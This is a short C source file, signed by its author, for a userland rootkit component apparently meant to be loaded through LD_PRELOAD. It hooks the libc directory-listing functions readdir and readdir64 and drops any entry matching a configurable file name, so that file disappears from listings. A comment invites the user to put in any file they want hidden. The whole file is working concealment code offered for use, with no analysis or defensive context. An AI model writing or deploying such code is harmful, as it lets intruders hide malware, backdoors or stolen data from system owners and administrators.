#define _GNU_SOURCE 
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
// by devil0x1
#define FILENAME "test.txt" // change this string value to any of the file you wanted to hide 

static struct dirent *(*original_readdir)(DIR *) = NULL;
static struct dirent64 *(*original_readdir64)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = (struct dirent *(*)(DIR *))
            dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *ep;
    while ((ep = original_readdir(dirp)) != NULL) {
        if (strcmp(ep->d_name, FILENAME) == 0) // it will skip the entry tho
            continue;
        return ep;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    if (!original_readdir64) {
        original_readdir64 = (struct dirent64 *(*)(DIR *))
            dlsym(RTLD_NEXT, "readdir64");
    }

    struct dirent64 *ep;
    while ((ep = original_readdir64(dirp)) != NULL) {
        if (strcmp(ep->d_name, FILENAME) == 0)
            continue;
        return ep;
    }
    return NULL;
}
